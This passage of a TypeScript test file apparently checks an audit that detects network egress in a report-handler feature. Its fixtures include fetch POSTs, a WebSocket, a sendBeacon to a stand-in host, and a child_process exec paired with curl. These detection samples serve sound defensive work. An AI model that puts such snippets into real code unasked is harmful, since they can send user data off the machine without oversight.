    ['...and its promises SUBPATH, which the first cut of this regex missed', `import dns from 'node:dns/promises';`],
    ['an egress package SUBPATH', `import { fetch } from 'undici/fetch';`],
    ['undici', `import { request } from 'undici';`],
    ['node-fetch', `import fetchIt from 'node-fetch';`],
    ['axios', `import axios from 'axios';`],
    ['got', `import got from 'got';`],
    ['the ws client', `import WS from 'ws';`],
    ['an eventsource', `import ES from 'eventsource';`],
    // The spellings that are not a static import at all.
    ['a REQUIRED socket module', `const net = require('node:net');`],
    ['a DYNAMIC https import', `const h = await import('node:https');`],
    ['a BACKTICK dynamic import of https', 'const h = await import(`node:https`);'],
    ['a RE-EXPORT of an egress package', `export * from 'undici';`],
    ['a BARE side-effect import of one', `import 'node-fetch';`],
    // No import needed.
    ['the global fetch', `const r = await fetch(url, { method: 'POST' });`],
    ['an XHR', `const x = new XMLHttpRequest();`],
    ['a WebSocket', `const s = new WebSocket('wss://x.invalid');`],
    ['a beacon', `navigator.sendBeacon('https://x.invalid', body);`],
    ['process.binding', `const p = process.binding('http_parser');`],
  ];
  const IGNORED: readonly [string, string][] = [
    // THE FALSE-POSITIVE DIRECTION MATTERS TOO: a reader that calls innocent code egress
    // sends its next author to widen the rule instead of reading it.
    ['a local file read', `import fs from 'node:fs';`],
    ['...and ITS promises subpath, so the subpath widening did not overreach', `import fs from 'node:fs/promises';`],
    ['a path join', `import path from 'node:path';`],
    ['a hash', `import { createHash } from 'node:crypto';`],
    ['a uuid', `import { v4 } from 'uuid';`],
    ['a LOCAL module whose name merely contains https', `import { x } from './https-helper.js';`],
    ['a URL in a string constant — the audited door holds one', `const API = 'https://api.github.com';`],
    ['a URL in prose', `// POSTs to https://api.github.com/repos/x/y/issues\nconst x = 1;`],
    ['an egress import named only in a comment', `// import https from 'node:https';\nconst x = 1;`],
    ['a word ENDING in fetch', `const v = await prefetch(key);`],
    ['a child_process import on its own — E3 is the PAIR, not the import', `import { execFile } from 'node:child_process';\nexecFile('sips', args);`],
  ];
  for (const [label, code] of CAUGHT) {
    it(`sees ${label}`, () => {
      expect(egressMarkersIn(code), `the vocabulary is blind to ${label}: ${code}. A module like `
        + 'this could be wired into the report handler and reach the wire unmeasured')
        .not.toEqual([]);
    });
  }
  for (const [label, code] of IGNORED) {
    it(`does not call ${label} egress`, () => {
      expect(egressMarkersIn(code), `${label} was called egress; the next author will be sent to `
        + 'widen this rule instead of reading it').toEqual([]);
    });
  }
  it('sees the shell pair, and only as a pair', () => {
    expect(shellEgressIn(`import { exec } from 'node:child_process';\nexec('curl -s ' + url);`))
      .toBe(true);
    expect(shellEgressIn(`import { exec } from 'node:child_process';\nexec('sips -Z 64 ' + f);`))
      .toBe(false);
    expect(shellEgressIn(`const cmd = 'curl -s https://x.invalid';`)).toBe(false);
  });
});

describe('the walk is transitive and leaves nothing unmeasured', () => {
  it('reaches a real graph from BOTH files the handler is made of', () => {
    expect(HANDLER_ENTRIES.length, 'the handler is two files; a walk that seeds one has a hole '
      + 'exactly where the split is').toBe(2);
  });
});

describe('E1c — the feature imports a closed set of packages, because a package is a leaf', () => {

  it('...and the clause is reading a real set, not an empty one', () => {
    expect(FEATURE_PACKAGES.length).toBeGreaterThan(3);
    // The egress vocabulary and the package pin must agree about the obvious case: every
    // declared package is inert, so none of them is an egress specifier.
    for (const pkg of FEATURE_PACKAGES) {
      expect(egressMarkersIn(`import x from '${pkg}';`), `${pkg} is itself an egress package `
        + 'and is on the feature\'s allowed list').toEqual([]);
    }
  });
});

describe('E3 — the shell is a way out too', () => {

  // ⚠ THIS CLAUSE ASKS THE FOUND SET, NOT THE CONSTANT, AND THE DIFFERENCE IS THE WHOLE
  // POINT. Written against `SHELL_EGRESS_IN_CLOSURE` it would be a statement about a list
  // somebody maintains by remembering — a feature module that shelled out to `curl` would
  // fail only the exact-set clause above and this one would report green about it, which is
  // the same defect as a census that reads one spelling out of six.
  it('...and nothing in the feature\'s own code shells out to the network', () => {
    // Non-vacuity: the declared manifest must agree with it, so a name cannot be parked on
    // the constant to quieten the clause above while sitting inside the feature.
    expect(SHELL_EGRESS_IN_CLOSURE.filter(inFeature)).toEqual([]);
  });
});

describe('E4 — the walk\'s scope is declared, so an unwired module is not a silent gap', () => {
  it('every production module in the feature\'s three directories is reachable', () => {
    // ⚠ BOTH DIRECTIONS OF THE AGREEMENT (re-review NB4). The loop below proves every file the
    // scan found is matched by FEATURE_DIRS; this line proves the converse — a FOURTH pattern
    // added to FEATURE_DIRS without a root above would widen E1/E1c while leaving its
    // directory outside the register, which is the gap NB2 found in the shared package.
    expect(FEATURE_DIRS.length, 'FEATURE_DIRS and this clause\'s hardcoded roots have drifted: '
      + 'a pattern was added without a scan root, so its directory has no unreachable-module '
      + 'register').toBe(3);
  });

});
